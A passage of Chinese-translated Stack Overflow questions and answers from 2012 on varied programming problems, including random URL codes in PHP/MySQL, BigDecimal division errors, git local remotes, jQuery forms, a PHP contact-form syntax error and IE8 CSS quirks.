我有一个自动递增的消息表，我只想能够捕获自动递增的 ID 号并将其与随机生成的代码一起存储。然后，我将使用此代码吐出整个页面。例如，假设用户刚刚更新了一条新消息，并且自动递增消息 ID 是 429。我希望能够存储该 429 并在末尾添加一个 5 位代码，以便消息自动获取 429 ID，而且在其列中有一个标识符，其代码类似于 429mUwIz。

然后，我将拥有一个公共页面，该页面将获取该代码并显示特定消息。因此，如果您要访问 www.example.com/429mUwIz，它会显示您输入的消息。我显然需要 5 个随机生成器，因此用户不能直接访问 www.example.com/1、www.example.com/2 并滥用系统。

那么提出这样一个代码的最佳方法是什么，我知道 mysql_insert_id 不起作用，因为我需要与插入一起存储的 ID。

附件是 Path 如何创建这样一个系统的一个例子。如果有帮助，他们的信件也区分大小写。

[https://path.com/p/2BTxys](https://path.com/p/2BTxys)

谢谢。

编辑：创建这个随机 5 键代码的最佳方法是什么。对不起。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:11:25.023

你可以查询它

```
$r = mysql_query("SHOW TABLE STATUS LIKE 'table_name' ");
$row = mysql_fetch_array($r);
$Auto_increment = $row['Auto_increment']; 
```

这将检索下一个自动增量 id ... [SHOW TABLE STATUS 的文档here](http://dev.mysql.com/doc/refman/5.5/en/show-table-status.html)

并生成一个 5 个字符的随机字符串使用

```
$rand = substr(md5(microtime()),rand(0,26),5); 
```

使用`microtime()`and`md5`产生一个哈希，然后随机抓取 5 个字符.....它不需要是唯一的，因为您正在使用它的自动增量 id ...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:12:17.063

您可以避免这种情况，我的意思是，您不必将 AUTO_INCREMENT id 存储在随机代码中。将随机代码单独存储在自己的列中，然后在用户询问页面时检查它。如果 ID 和随机码不匹配，则不显示该页面。

目前，我可以假设您正在使用以下方法查询路径：

```
SELECT * FROM Paths WHERE key = '429mUwIz' 
```

但这完全等同于：

```
SELECT * FROM Paths WHERE id = '429' AND key = 'mUwIz' 
```

您只需从 URL 中拆分 ID 和 KEY。您可以通过将所有数字视为 ID 部分，将所有字母视为 KEY 部分来做到这一点。

# java - 是什么导致 BigDecimal.divide 出现“非终止十进制扩展”异常？

> ID：10603651
> 
> 赞同：30
> 
> 时间：2012-05-15T15:07:14.787
> 
> 标签：java, exception, bigdecimal

我以前使用过 BigDecimals，但不是很频繁，今天早上我正在做一些事情，但我一直收到以下异常：

```
Exception in thread "main" java.lang.ArithmeticException: Non-terminating decimal expansion;
no exact representable decimal result.
    at java.math.BigDecimal.divide(BigDecimal.java:1594) 
```

我试图设置比例并使用四舍五入来消除这样的问题：

```
 BigDecimal bd1 = new BigDecimal(1131).setScale(2,BigDecimal.ROUND_HALF_UP);
    BigDecimal bd2 = new BigDecimal(365).setScale(2,BigDecimal.ROUND_HALF_UP);
    BigDecimal bd3 = bd1.divide(bd2).setScale(2,BigDecimal.ROUND_HALF_UP);
    System.out.println("result: " + bd3); 
```

但是，我不断收到同样的异常。谁能告诉我我在哪里犯了错误？

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-05-15T15:11:58.717

# 非终止小数需要四舍五入

使用[`divide`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/math/BigDecimal.html#divide(java.math.BigDecimal,java.math.MathContext))时应使用[`MathContext`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/math/MathContext.html)with[`RoundingMode`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/math/RoundingMode.html)以防确切结果有无限位小数。

你的情况就是这样：

```
MathContext mc = new MathContext(2, RoundingMode.HALF_UP) ;
BigDecimal bd3 = bd1.divide(bd2, mc); 
```

或者调用[`divide`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/math/BigDecimal.html#divide(java.math.BigDecimal,java.math.RoundingMode))传递比例和舍入模式。

```
BigDecimal bd3 = bd1.divide(bd2, RoundingMode.HALF_UP); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T15:11:53.180

这就是问题所在

```
bd1.divide(bd2) 
```

您需要使用`divide()`采用舍入模式（以各种形式）的重载方法之一 - 您不能在除法之后进行舍入，因为对于非终止分数，中间结果要么已经需要舍入，要么需要无限的存储空间。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-15T15:17:14.740

该问题是由会导致循环小数的操作（除法）引起的。

解决方法是在进行除法时指定一个*比例，例如：*

```
BigDecimal one = new BigDecimal("1");
BigDecimal three = new BigDecimal("3");
BigDecimal oneDivThree = one.divide(three, 200, RoundingMode.HALF_UP); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-15T15:11:14.880

由于除法，您会收到此错误：

1.  默认情况下，BigDecimal 总是尝试返回操作的确切结果。
2.  因此，某些除法运算，如 1 除以 3，精确商将具有无限长的十进制扩展。这将导致除法操作失败并抛出上述错误。

在除法方法中提供比例和舍入模式（正如您在创建 BigDecimals 时所做的那样）以防止这种情况发生。

取自[这里](http://jaydeepm.wordpress.com/2009/06/04/bigdecimal-and-non-terminating-decimal-expansion-error/)。还提供了工作划分的示例代码。

另请参阅：[BigDecimal 上的 Java 文档](http://docs.oracle.com/javase/1.5.0/docs/api/java/math/BigDecimal.html)。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-05-15T15:12:50.377

默认情况下，BigDecimal 尝试返回给定除法表达式的确切值。因此，如果由于无限小数扩展而无法确定确切的值，则会引发 ArithmeticException。一个基本的例子是用 1 除以 3，得到三分之一，这个值不能用十进制表示法精确表示。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-15T15:17:18.453

要修复，您应该更改第三条语句，如下所示：

```
BigDecimal bd1 = new BigDecimal(1131).setScale(2,BigDecimal.ROUND_HALF_UP);
BigDecimal bd2 = new BigDecimal(365).setScale(2,BigDecimal.ROUND_HALF_UP);
BigDecimal bd3 = bd1.divide(bd2, 2, BigDecimal.ROUND_HALF_UP);
System.out.println("result: " + bd3); 
```

# ruby - 几个散列到网格中

> ID：10603661
> 
> 赞同：1
> 
> 时间：2012-05-15T15:08:01.313
> 
> 标签：ruby, hash

我有几个哈希

```
hash1 = { :c1234 => 0.7, :c1237 => 0.8, :c1634 => 0.6, :c1224 => 0.3, :c1291 => 0.1 }
hash2 = { :c1234 => 0.5, :c1136 => 0.2, :c1634 => 0.7, :c1524 => 0.1, :c2291 => 0.9, :c2391 => 0.7 }
hash3 = { :c1234 => 0.3, :c1136 => 0.4, :c6321 => 0.5 } 
```

我需要从这些哈希中创建矩阵，例如

```
numhash c1234 c1237 c1634 c1224 c1291 c1136 c1524 c2291 c2391 c6321
hash1     0.7   0.8   0.6   0.3   0.1     0     0     0     0     0
hash2     0.5     0   0.7     0     0   0.2   0.1   0.9   0.7     0
hash3     0.3     0     0     0     0   0.4     0     0     0   0.5

numhash = 3 (number of hashes) 
```

请帮助我在 Ruby 中做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:11:06.893

您不应将哈希值存储在许多局部变量中，而应将其存储在可枚举的集合中，例如数组或哈希。例如，使用散列来命名每个散列“行”：

```
data = {
  h1:     {c1234:0.7,c1237:0.8,c1634:0.6,c1224:0.3,c1291:0.1},
  cats:   {c1234:0.5,c1136:0.2,c1634:0.7,c1524:0.1,c2291:0.9,c2391:0.7},
  kittens:{c1234:0.3,c1136:0.4,c6321:0.5}
}

def print_grid(data)
  cols     = data.values.flat_map(&:keys).uniq.sort
  head     = data.keys.map(&:length).max
  template = "%#{head}s | #{cols.map{ |c| "%#{c.length}s" }.join(' | ')}"
  puts template % [ "", *cols ]
  data.each do |row,pairs|
    values = cols.map{ |col| pairs[col] || 0.0 }
    puts template % [ row, *values ]
  end
  puts "", "numhashes: #{data.length}"
end

print_grid(data)    
#=>         | c1136 | c1224 | c1234 | c1237 | c1291 | c1524 | c1634 | c2291 | c2391 | c6321
#=>      h1 |   0.0 |   0.3 |   0.7 |   0.8 |   0.1 |   0.0 |   0.6 |   0.0 |   0.0 |   0.0
#=>    cats |   0.2 |   0.0 |   0.5 |   0.0 |   0.0 |   0.1 |   0.7 |   0.9 |   0.7 |   0.0
#=> kittens |   0.4 |   0.0 |   0.3 |   0.0 |   0.0 |   0.0 |   0.0 |   0.0 |   0.0 |   0.5
#=> 
#=> numhashes: 3 
```

如果您将最后一张地图更改为...

```
values = columns.map{ |col| pairs[col] || "-" } 
```

然后你得到：

```
 | c1136 | c1224 | c1234 | c1237 | c1291 | c1524 | c1634 | c2291 | c2391 | c6321
     h1 |     - |   0.3 |   0.7 |   0.8 |   0.1 |     - |   0.6 |     - |     - |     -
   cats |   0.2 |     - |   0.5 |     - |     - |   0.1 |   0.7 |   0.9 |   0.7 |     -
kittens |   0.4 |     - |   0.3 |     - |     - |     - |     - |     - |     - |   0.5 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:27:58.210

```
hash1 = {:c1234 => 0.7, :c1237 => 0.8, :c1634 => 0.6, :c1224 => 0.3, :c1291 => 0.1} 
hash2 = {:c1234 => 0.5, :c1136 => 0.2, :c1634 => 0.7, :c1524 => 0.1, :c2291 => 0.9, :c2391 => 0.7}
hash3 = {:c1234 => 0.3, :c1136 => 0.4, :c6321 => 0.5}

all_hashes = [hash1, hash2, hash3]
all_keys = all_hashes.flat_map(&:keys).uniq

puts "#{all_hashes.length}\t#{all_keys.join("\t")}"
all_hashes.each_with_index do | hash, i |
  puts "hash#{i}\t#{all_keys.map { | k | hash[k]}.join("\t")}"
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:26:24.217

尝试

```
numhash = { :hash1 => { :c1234=>0.7,:c1237=>0.8,:c1634=>0.6,:c1224=>0.3,:c1291=>0.1 }, :hash2 => { :c1234 => 0.5, :c1136 => 0.2, :c1634 => 0.7, :c1524 => 0.1, :c2291 => 0.9, :c2391 => 0.7} } 
```

等等...然后您可以通过`numhash[:hash1][:c1237]`例如访问值。

# input - onclick 输入框全选 IE8

> ID：10603666
> 
> 赞同：1
> 
> 时间：2012-05-15T15:08:11.390
> 
> 标签：input, internet-explorer-8, onclick

我有一个我无法解决的问题。我已经看了一遍，尝试了一切。我的网站上有一个数字输入字段。当用户单击数字输入中的任意位置时，我希望它突出显示它当前包含的内容。我使用 this.select() 来做到这一点。它适用于所有浏览器，除了 Internet Explorer 8。它甚至适用于 ie7、ie6 等。当我告诉它在点击时提醒消息时，它甚至不会这样做，所以我认为这不是问题使用 this.select()。除非您直接单击已经存在的数字，否则它不会注册已单击输入字段，但我希望用户单击输入字段内的任何位置。我试过使用onclick、onmousedown、focus，我试过把它放在一个div中，但ie8没有任何效果。有任何想法吗？这是代码：

```
<td id="week_1_day_2_div" width="90px" align="center" valign="middle">
<input type="number" id="week_1_day_2_numberbox" min="0" maxlength="5" size="5" 
value="10198" onclick="this.select()" onchange="checkInput(1,2,0)" max="99999"
style="background-color:transparent; height:20px; width:80px; border:1px solid 
#000000;">
</td> 
```

# wsdl - 比较 WSDL 文件

> ID：10603670
> 
> 赞同：1
> 
> 时间：2012-05-15T15:08:33.183
> 
> 标签：wsdl

我正在学习有关 wsdl 文件的所有信息，因为我需要将数据传输到一些为他们的 API 提供 wsdl 的地方。我在安装了 SOAP 的 LAMP 环境中。

当我从[http://www.w3schools.com/wsdl/wsdl_ports.asp](http://www.w3schools.com/wsdl/wsdl_ports.asp)阅读它时， 我注意到 W3 School 的版本比我正在使用的真实版本更简单。

这是W3 School的教程版本：

```
<message name="newTermValues">
<part name="term" type="xs:string"/>
<part name="value" type="xs:string"/>
</message> 
```

这是我正在使用的 wsdl 文件的真实摘录：

```
<wsdl:message name="StatesGetXMLHttpPostOut">
<wsdl:part name="Body"/>
</wsdl:message> 
```

我注意到一些差异和一些相似之处。就像，为什么`<wsdl:`在后一个版本中要加上“”？这只是 SOAP 理解的一些 xml 灵活性吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:39:14.977

“wsdl”部分是一个 XML 命名空间别名。命名空间是必需的，但有一个默认命名空间的概念，它在没有给出别名时适用。这是由根元素上的属性定义的，例如参见[XML Default Namespace](http://www.quackit.com/xml/tutorial/xml_default_namespace.cfm)。

# git - 如何添加本地仓库并将其视为远程仓库

> ID：10603671
> 
> 赞同：306
> 
> 时间：2012-05-15T15:08:36.393
> 
> 标签：git, git-remote

我正在尝试使用以下命令在我的 PC 上使用另一个本地 repo 的名称将本地 repo 用作远程`bak`：

```
git remote add /home/sas/dev/apps/smx/repo/bak/ontologybackend/.git bak 
```

这给出了这个错误：

```
fatal: '/home/sas/dev/apps/smx/repo/bak/ontologybackend/.git' is not a valid remote name 
```

我正在尝试同步两个本地存储库，其中一个配置为以`bak`另一个命名的远程，然后发出`git pull bak`.

最好的方法是什么？

* * *

**编辑：**

对不起，我很傻，我刚刚意识到远程添加应该是：

```
git remote add bak /home/sas/dev/apps/smx/repo/bak/ontologybackend/.git 
```

遥控器的名称在地址*之前。*

* * *

## 回答 #1

> 赞同：346
> 
> 时间：2012-05-15T15:13:54.753

您对`remote add`命令的参数进行了反转：

```
git remote add <NAME> <PATH> 
```

所以：

```
git remote add bak /home/sas/dev/apps/smx/repo/bak/ontologybackend/.git 
```

有关`git remote --help`更多信息，请参阅。

* * *

## 回答 #2

> 赞同：208
> 
> 时间：2015-12-29T08:08:47.003

如果您的目标是保留存储库的本地副本以便于备份或粘贴到外部驱动器或通过云存储（Dropbox 等）共享，您可能需要使用[裸存储库](http://www.saintsjd.com/2011/01/what-is-a-bare-git-repository/)。这允许您在没有工作目录的情况下创建存储库的副本，并针对共享进行了优化。

例如：

```
$ git init --bare ~/repos/myproject.git
$ cd /path/to/existing/repo
$ git remote add origin ~/repos/myproject.git
$ git push origin master 
```

同样，您可以像远程仓库一样进行克隆：

```
$ git clone ~/repos/myproject.git 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2020-04-17T16:54:17.100

我发布此答案是为了提供一个脚本，其中包含创建具有本地远程的本地存储库的三种不同场景的解释。您可以运行整个脚本，它将在您的主文件夹中创建测试存储库（在 windows git bash 上测试）。解释在脚本中，以便更容易地保存到您的个人笔记中，它非常易于阅读，例如 Visual Studio Code。

我还要感谢[杰克](https://stackoverflow.com/users/5446285/jack)链接到[这个答案](https://stackoverflow.com/questions/7632454/how-do-you-use-git-bare-init-repository/31590993#31590993)，其中[adelphus](https://stackoverflow.com/users/1132806/adelphus)对这个主题有很好的、详细的、动手的解释。

这是我在这里的第一篇文章，所以请告知应该改进的地方。

```
## SETUP LOCAL GIT REPO WITH A LOCAL REMOTE
# the main elements:
# - remote repo must be initialized with --bare parameter
# - local repo must be initialized
# - local repo must have at least one commit that properly initializes a branch(root of the commit tree)
# - local repo needs to have a remote
# - local repo branch must have an upstream branch on the remote

{ # the brackets are optional, they allow to copy paste into terminal and run entire thing without interruptions, run without them to see which cmd outputs what

cd ~
rm -rf ~/test_git_local_repo/

## Option A - clean slate - you have nothing yet

mkdir -p ~/test_git_local_repo/option_a ; cd ~/test_git_local_repo/option_a
git init --bare local_remote.git # first setup the local remote
git clone local_remote.git local_repo # creates a local repo in dir local_repo
cd ~/test_git_local_repo/option_a/local_repo
git remote -v show origin # see that git clone has configured the tracking
touch README.md ; git add . ; git commit -m "initial commit on master" # properly init master
git push origin master # now have a fully functional setup, -u not needed, git clone does this for you

# check all is set-up correctly
git pull # check you can pull
git branch -avv # see local branches and their respective remote upstream branches with the initial commit
git remote -v show origin # see all branches are set to pull and push to remote
git log --oneline --graph --decorate --all # see all commits and branches tips point to the same commits for both local and remote

## Option B - you already have a local git repo and you want to connect it to a local remote

mkdir -p ~/test_git_local_repo/option_b ; cd ~/test_git_local_repo/option_b
git init --bare local_remote.git # first setup the local remote

# simulate a pre-existing git local repo you want to connect with the local remote
mkdir local_repo ; cd local_repo
git init # if not yet a git repo
touch README.md ; git add . ; git commit -m "initial commit on master" # properly init master
git checkout -b develop ; touch fileB ; git add . ; git commit -m "add fileB on develop" # create develop and fake change

# connect with local remote
cd ~/test_git_local_repo/option_b/local_repo
git remote add origin ~/test_git_local_repo/option_b/local_remote.git
git remote -v show origin # at this point you can see that there is no the tracking configured (unlike with git clone), so you need to push with -u
git push -u origin master # -u to set upstream
git push -u origin develop # -u to set upstream; need to run this for every other branch you already have in the project

# check all is set-up correctly
git pull # check you can pull
git branch -avv # see local branch(es) and its remote upstream with the initial commit
git remote -v show origin # see all remote branches are set to pull and push to remote
git log --oneline --graph --decorate --all # see all commits and branches tips point to the same commits for both local and remote

## Option C - you already have a directory with some files and you want it to be a git repo with a local remote

mkdir -p ~/test_git_local_repo/option_c ; cd ~/test_git_local_repo/option_c
git init --bare local_remote.git # first setup the local remote

# simulate a pre-existing directory with some files
mkdir local_repo ; cd local_repo ; touch README.md fileB

# make a pre-existing directory a git repo and connect it with local remote
cd ~/test_git_local_repo/option_c/local_repo
git init
git add . ; git commit -m "inital commit on master" # properly init master
git remote add origin ~/test_git_local_repo/option_c/local_remote.git
git remote -v show origin # see there is no the tracking configured (unlike with git clone), so you need to push with -u
git push -u origin master # -u to set upstream

# check all is set-up correctly
git pull # check you can pull
git branch -avv # see local branch and its remote upstream with the initial commit
git remote -v show origin # see all remote branches are set to pull and push to remote
git log --oneline --graph --decorate --all # see all commits and branches tips point to the same commits for both local and remote
} 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-05-15T15:14:44.490

您的格式似乎不正确：

> 如果您想共享本地创建的存储库，或者您想从其他人的存储库中获取贡献 - 如果您想以任何方式与新存储库进行交互，通常将其添加为远程存储库是最简单的。你可以通过运行 git remote add [alias] [url] 来做到这一点。这会在名为 [alias] 的本地远程下添加 [url]。

```
#example
$ git remote
$ git remote add github git@github.com:schacon/hw.git
$ git remote -v 
```

[http://gitref.org/remotes/#remote](http://gitref.org/remotes/#remote)

# jquery - 多种形式：如何从使用过的表单中获取表单值？

> ID：10603672
> 
> 赞同：2
> 
> 时间：2012-05-15T15:08:37.880
> 
> 标签：jquery, forms

我动态创建了一个表单列表，但在提交用户之前会收到一个 jquery 确认警报。我想在此确认文本中提及一个表单值，但我不知道如何执行此操作

```
<form name="team_uit_laddercompetitie_zetten_frm" method="post" class="confirm_submit">
            <input type="hidden" name="todo" value="team_uit_laddercompetitie_zetten" />
            <input type="hidden" name="teamID" value="<?php echo $aKlasse[$k]['teamnr'];?>" />
            <input type="hidden" name="teamnaam" value="<?php echo teamnaam($aKlasse[$k]['teamnr']);?>" />
            <input type="submit" id="team_uit_laddercompetitie_zetten_submit" value="TEST: uit competitie zetten" />
        </form> 
```

这是我的 jquery 部分：

```
<script type="text/javascript"> 
$(".confirm_submit").click( function(){ 
var test = $this.form.teamnaam.value;
jConfirm('xWeet u zeker dat u het team:  uit de laddercompetietie wilt verwijderen?' + test, function(r) {
    if(r == true)
    {
        //$('#team_uit_laddercompetitie_zetten_frm').submit();
        alert('test');
        return true;
    }
    else
        return false;
    });
return false;
}); 
</script> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T15:11:40.047

`teamnaam`这将为您提供当前表单中具有名称的元素的值]

```
var test = $(this).closest("form").find("input[name='teamnaam']").val(); 
```

# jquery - 需要在地图上绘制以某种方式相关的三个表格作为标记。生成 JSON 文件以绘制它们的最佳方法？

> ID：10603673
> 
> 赞同：2
> 
> 时间：2012-05-15T15:08:40.573
> 
> 标签：jquery, json, google-maps, google-maps-api-3, google-maps-markers

有点进退两难。我有表**学校**、**项目**、**赞助商**。

**学校**和**项目**有一个连接/关联表（**学校**已经完成了一些**项目**）。**赞助商**和**项目**（**赞助商**赞助了某些**学校**完成的某些**项目**）。因此，它们都是相关/连接的。稍后，我想使用这种互连来过滤一堆表单控件。

 **所有三个表（**Schools**、**Projects**、**Sponsors**）都有纬度和经度列。

使用 JSON，我想在我的地图（Google Maps API v3）上绘制所有三个标记，并以某种方式显示它们是如何连接的。我目前正在[为 jQuery 使用这个 Google Maps v3 插件](http://code.google.com/p/jquery-ui-map/)。

因此，地图初始化时将有三种类型的标记 -**学校**（名称、地址、电话、学校的专业类型、已完成的项目等）、**项目**（名称、描述、专业领域）、**赞助商**（姓名、地址、电话、赞助项目等）。

过滤将基于“专业类型”（将显示所有具有选定专业类型的学校、他们所做的所有项目以及每个项目的所有赞助商）和“专业领域”（将显示所有选定的项目专业领域，所有完成这些项目的学校以及与每个项目相关的所有赞助商）。

**问题是**我不确定如何生成 JSON 文件（或文件？）及其结构。

我是否应该为每个表（**Schools**、**Projects**、**Sponsors**）生成三个不同的 JSON 文件，其中将包含数据以及位置（lat、lng）以将它们绘制为标记。

*或者*

我是否应该生成一个巨大的 JSON 文件，比方说，基于**Schools**将包含**Projects**子节点，而 Projects 子节点又将包含**Sponsors**子节点？

*或者*

你会如何处理这个问题？

到目前为止，我已经设法在我的地图上绘制了所有学校作为标记：

```
$(function(){
    $('#map_canvas').gmap(mapOptions).bind('init', function() {
        $.getJSON( 'results.json', function(data) {                         
            $.each(data.schools, function(i, s) {                           
                $('#map_canvas').gmap('addMarker', {
                    'position': new google.maps.LatLng(s.Lat, s.Lng),
                    'bounds':true
                }).click(function() {                               
                    $('#map_canvas').gmap('openInfoWindow', {
                        'content': '<h1>'+s.SchoolName+'</h1>'+
                        '<p style="color: green">'+s.SchoolAddress+'</p>'
                    }, this);                           
                });                     
            });                 
        });             
    });         
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-19T01:27:51.450

我处理这个（并且它*有效*）的方式如下：

我没有生成包含所有三个表中的数据的一个（或三个单独`JSON`的）文件，而是简单地生成一个 SQL 查询，该查询是根据用户希望在地图上看到的内容构建的。

因此，如果用户只想查看**学校**- 构建一个 SQL 查询，该查询仅从数据库中获取**学校**并将数据（名称、地址、电话、学校的专业类型、已完成的项目等）格式化为`JSON`在线格式-飞。

如果用户想在地图上看到不止一种类型的标记（例如**Schools**及其**Projects**） - 只需构建 SQL 查询，用于`JOIN`获取有关**Schools**、**Projects**及其关系数据的数据，这些数据可用于将每所学校链接到适当的**项目**（**学校** `infobox`有两个选项卡 -*学校信息*和*已完成的项目*），反之亦然。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-16T14:26:12.993

JSON 生成非常简单。JSON 只是以这样的方式格式化的字符串，它们可以在不同平台之间发送并解码为可用的东西，如数组。

至于格式，也许您可​​以制作另一个纬度/经度表作为主键，以跟踪每个纬度/经度位置与其关联的内容（即学校/项目/赞助商）。

所以你有了：

```
Location | School     | Project     | Sponsor
---------|------------|-------------|----------
12/46    | Hoover Elem| Science Fair| NULL
37/87    | NULL       | Recycling   | GreenSponsor
45/32    | Lonely High| NULL        | NULL 
```

等等。这样，您可以查询此表以映射相对于每个位置的关系。

如果每个元素（学校/项目/赞助商）都有位置，您应该能够通过使用精心制作的 SELECT 语句自动生成该表

编辑：即使它不像“从这三个具有相同位置的表中选择所有名称”那么简单，您也应该能够选择一个位置（我假设是学校），然后根据“专业化”或“填写任何关系”已完成的项目”，学校与项目共享，如果存在，请检查是否有与这些项目相关的赞助商。**

# php - PHP电子邮件脚本总是发送电子邮件加上语法错误？

> ID：10603676
> 
> 赞同：-2
> 
> 时间：2012-05-15T15:08:53.400
> 
> 标签：php, email

为什么无论您是否输入验证码，我的联系页面都不会通过电子邮件发送表单中的详细信息。如果您以错误的方式结束验证码，则会显示错误消息但电子邮件仍会发送？我已经坚持了好几天了。

PHP 语法检查器说这段代码有错误：

```
<?php

if(isset($_POST['email'])) {

    // EDIT THE 2 LINES BELOW AS REQUIRED
    $email_to = "myemail@hotmail.co.uk";
    $email_subject = "Your email subject line";

    function died($error) {
        // your error code can go here
        echo "We are very sorry, but there were error(s) found with the form you submitted. ";
        echo "These errors appear below.<br /><br />";
        echo $error."<br /><br />";
        echo "Please go back and fix these errors.<br /><br />";
        die();
    }

    // validation expected data exists
    if(!isset($_POST['name']) ||
        !isset($_POST['email']) ||
        !isset($_POST['phone']) ||
        !isset($_POST['msg'])) {
        died('We are sorry, but there appears to be a problem with the form you submitted.');      
    }

    $name = $_POST['name']; // required
    $email = $_POST['email']; // required
    $phone = $_POST['phone']; // not required
    $msg = $_POST['msg']; // required

    $error_message = "";
    $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
  if(!preg_match($email_exp,$email)) {
    $error_message .= 'The Email Address you entered does not appear to be valid.<br />';
  }
    $string_exp = "/^[A-Za-z .'-]+$/";
  if(!preg_match($string_exp,$name)) {
    $error_message .= 'The Name you entered does not appear to be valid.<br />';
  }
  if(strlen($msg) < 2) {
    $error_message .= 'The Comments you entered do not appear to be valid.<br />';
  }
  if(strlen($error_message) > 0) {
    died($error_message);
  }
    $email_message = "Form details below.\n\n";

    function clean_string($string) {
      $bad = array("content-type","bcc:","to:","cc:","href");
      return str_replace($bad,"",$string);
    }

    $email_message .= "Name: ".clean_string($name)."\n";
    $email_message .= "Email: ".clean_string($email)."\n";
    $email_message .= "Phone: ".clean_string($phone)."\n";
    $email_message .= "Message: ".clean_string($msg)."\n";

// create email headers
$headers = 'From: '.$email."\r\n".
'Reply-To: '.$email."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail($email_to, $email_subject, $email_message, $headers); 
?> 
```

它说最后一行是问题`?>`

> 解析错误：语法错误，第 65 行代码中的意外 $end 解析代码错误

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T15:09:56.727

您错过了`}`最外层`if`声明的结尾：

```
if (isset($_POST['email'])) {

   // Code

} // This is missing 
```

为了将来参考，`unexpected $end`很可能意味着您在某处缺少 a`}`或 a 。`;`

# css - ie8（iframe）中的css分页符

> ID：10603679
> 
> 赞同：3
> 
> 时间：2012-05-15T15:09:09.280
> 
> 标签：css, internet-explorer-8, page-break

我有一个页面，其中放置了 3 个 iframe，其中显示了其他 3 个页面。一切都包裹在一个大的 DIV 元素中，每个 iframe 都包裹在自己的 DIV 元素中。在每个 DIV 之间，我使用以下 CSS 代码放置另一个 DIV 元素：

```
@media print { .page-break {display:block; page-break-before:always;} } 
```

在 Firefox（在这种情况下为版本 12，但我想这不是版本问题）中，一切都与打印整个页面的预期相同，但在 IE8 中，分页符 CSS 似乎根本不起作用，并且页面在打印时弄乱了。

我在这里遇到了一个答案，即此分页符不适用于定位元素，但在我的情况下，具有此 CSS 代码的元素是我在此处描述的 DIV 以及打印页面内容的定位（相对/绝对, float) 仅在页面源中完成，包含在 iframe 中而不是在主页中，所以我不确定这是我在这里遇到的情况的原因。

为了让这个分页符在 IE8 上也能正常工作，我需要做什么？

这是主页面的代码：

```
<style>
@media print { .page-break {display:block; page-break-before:always;} }
</style>

<div align="left">
<div id="frame_gop" align="left" style="width:759px;height:980px;">
<iframe src="page1.html" width="759" height="980" frameborder="0" align="left"></iframe>
</div>
<div class="page_break"></div>
<div id="frame_report" align="left" style="width:759px;height:980px;">
<iframe src="page2.html" width="759" height="980" frameborder="0" align="left"></iframe>
</div>
<div class="page_break"></div>
<div id="frame_release" align="left" style="width:759px;height:980px;">
<iframe src="page3.html" width="759" height="980" frameborder="0" align="left"></iframe>
</div>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-03-25T07:28:28.947

IE8 不支持@media 查询，请将其删除。只使用简单的类

**代替：**

```
@media print { .page-break {display:block; page-break-before:always;} } 
```

**从：**

```
.page-break {display:block; page-break-before:always;} 
```

谢谢

# c# - 编译器错误消息：CS0433

> ID：10603680
> 
> 赞同：7
> 
> 时间：2012-05-15T15:09:09.407
> 
> 标签：c#, asp.net, visual-studio-2008

我会突然出现一条奇怪的错误消息（我是初学者，用 C# 在 ASP.NET 中构建网站，发现错误的文件是 .ascx = 用户控制文件）：

编译器错误消息：CS0433：“...\Temporary ASP.NET Files\root\901650e7\5e27d040\App_Code.ybv-vo7n.dll”和“...\Temporary ASP.NET Files”中都存在“链接”类型\root\901650e7\5e27d040\assembly\dl3\f6cf02ac\a93eed1d_ab32cd01\Project1C.DLL'

第 10 行显然是错误的来源（红色）。你能指点一下吗？我不知道从哪里开始寻找/修复。谢谢！

```
Line 9:<ItemTemplate>
Line 10:<asp:HyperLink ID="HyperLink1" runat="server" 
Line 11:NavigateUrl='<%# Link.ToFilms(Eval("FilmsID").ToString()) %>'
Line 12:Text='<%# HttpUtility.HtmlEncode(Eval("Nume").ToString()) %>' 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-07-25T10:39:03.910

我知道答案有点晚了，但可能对其他人有一些帮助。

**问题：** 在这种情况下也有类似的问题：

*   VS2010 WebAppProject（不是WebSiteProject）
*   在 App_Code 中有一些独立的类（属性 [Build Action] 设置为 [Compile]）
*   构建成功，但在浏览器中加载 Web 应用程序时，它会抛出编译错误 CS0433：类型 ' *Namespace.Classname* ' 存在于两个 'c:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\ root\7e10b43d\77c16432\App_Code.itpfsoon.dll' 和 'c:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\root\7e10b43d\77c16432\assembly\dl3\2055583c\0bc450de_1589ce01\ *WebAppName* .DLL'

**解决方案：** 将需要属性 [Build Action] 设置为 [Compile] 的隔离类放到 App_Code 以外的任何文件夹中，因为 App_Code 文件夹将被编译为单独的程序集，在 2 个程序集中编译相同的类（**App_Code**和**WebApp**包括 App_Code 本身的所有代码）。

**参考：http:** [//vishaljoshi.blogspot.com/2009/07/appcode-folder-doesnt-work-with-web.html](http://vishaljoshi.blogspot.com/2009/07/appcode-folder-doesnt-work-with-web.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T15:14:21.790

您将拥有类似于以下的路径：

```
